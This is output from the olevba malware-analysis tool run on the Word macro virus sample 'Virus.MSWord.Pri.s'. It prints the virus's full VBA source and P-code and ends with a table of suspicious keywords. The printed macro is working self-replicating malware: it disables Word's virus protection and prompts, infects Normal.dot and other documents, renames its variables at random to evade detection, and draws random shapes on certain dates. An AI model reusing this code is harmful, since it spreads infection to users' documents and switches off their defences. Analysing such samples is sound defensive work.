olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.s
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.s - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) = 13 Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
LC733 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
RN6729 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set PV172 = ActiveDocument.VBProject.VBComponents.Item(1)
TQ4964 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set PV172 = NormalTemplate.VBProject.VBComponents.Item(1)
QC8648 = True
Call TK9994_EG2622
ActiveDocument.Saved = True
End If
If QC8648 <> True And TQ4964 <> True Then GoTo RE1443
If QC8648 = True Then PV172.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, LC733 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If TQ4964 = True Then PV172.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RN6729 - 3))
RE1443:
If RN6729 <> 0 And LC733 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Function TK9994_EG2622()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "MG3675": r1(2) = "KM6854": r1(3) = "AJ9354": r1(4) = "AM669": r1(5) = "EG2622": r1(6) = "LC733"
r1(7) = "RN6729": r1(8) = "TQ4964":: r1(9) = "PV172": r1(10) = "QC8648": r1(11) = "RE1443": r1(12) = "TK9994": r1(13) = "IA4377": r1(14) = "OD4481"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call EG2622(a1, r1(x))
Next x
End Function
Private Function EG2622(OD4481, IA4377 As String)
On Error Resume Next
Dim MG3675 As Long: Dim KM6854 As Long: Dim AJ9354 As Long: Dim AM669 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
MG3675 = 1: KM6854 = 1: AJ9354 = .CountOfLines: AM669 = Len(.Lines(.CountOfLines, 1))
Do While .Find(IA4377, MG3675, KM6854, AJ9354, AM669, True)
strline = .Lines(MG3675, 1)
strline = Left(strline, KM6854 - 1) & OD4481 & Mid(strline, AM669)
.replaceline MG3675, strline
MG3675 = AJ9354 + 1: KM6854 = 1:
AJ9354 = .CountOfLines
AM669 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function

Sub ViewVBCode()
End Sub
Sub ViewVBCode()
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Pri.s
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5519 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #3:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	LitDI2 0x000D 
' 	Eq 
' 	IfBlock 
' Line #4:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #5:
' 	Ld msoShapePentagon 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #6:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #7:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #8:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LC733 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St RN6729 
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set PV172 
' Line #13:
' 	LitVarSpecial (True)
' 	St TQ4964 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Pri"
' 	Ne 
' 	IfBlock 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set PV172 
' Line #17:
' 	LitVarSpecial (True)
' 	St QC8648 
' Line #18:
' 	ArgsCall (Call) TK9994_EG2622 0x0000 
' Line #19:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld QC8648 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld TQ4964 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo RE1443 
' 	EndIf 
' Line #22:
' 	Ld QC8648 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld LC733 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Paren 
' 	Ld PV172 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #23:
' 	Ld TQ4964 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0019 "Private Sub Document_Open"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld RN6729 
' 	LitDI2 0x0003 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld PV172 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #24:
' 	Label RE1443 
' Line #25:
' 	Ld RN6729 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld LC733 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Private Function TK9994_EG2622(id_FFFE As Variant))
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	ArgsCall Read 0x0000 
' Line #30:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn r1 (As String)
' Line #31:
' 	LitStr 0x0006 "MG3675"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "KM6854"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "AJ9354"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "AM669"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "EG2622"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "LC733"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' Line #32:
' 	LitStr 0x0006 "RN6729"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "TQ4964"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0005 "PV172"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "QC8648"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "RE1443"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "TK9994"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "IA4377"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "OD4481"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' Line #33:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #34:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #35:
' 	Ld a1 
' 	Ld x 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) EG2622 0x0002 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	EndFunc 
' Line #38:
' 	FuncDefn (Private Function EG2622(OD4481, IA4377 As String, id_FFFE As Variant))
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	Dim 
' 	VarDefn MG3675 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn KM6854 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn AJ9354 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn AM669 (As Long)
' Line #41:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #42:
' 	LitDI2 0x0001 
' 	St MG3675 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St KM6854 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St AJ9354 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St AM669 
' Line #43:
' 	Ld IA4377 
' 	Ld MG3675 
' 	Ld KM6854 
' 	Ld AJ9354 
' 	Ld AM669 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #44:
' 	Ld MG3675 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #45:
' 	Ld strline 
' 	Ld KM6854 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld OD4481 
' 	Concat 
' 	Ld strline 
' 	Ld AM669 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #46:
' 	Ld MG3675 
' 	Ld strline 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	Ld AJ9354 
' 	LitDI2 0x0001 
' 	Add 
' 	St MG3675 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St KM6854 
' 	BoS 0x0000 
' Line #48:
' 	MemLdWith CountOfLines 
' 	St AJ9354 
' Line #49:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St AM669 
' Line #50:
' 	Loop 
' Line #51:
' 	EndWith 
' Line #52:
' 	EndFunc 
' Line #53:
' Line #54:
' 	FuncDefn (Sub ViewVBCode())
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Sub ViewVBCode())
' Line #57:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

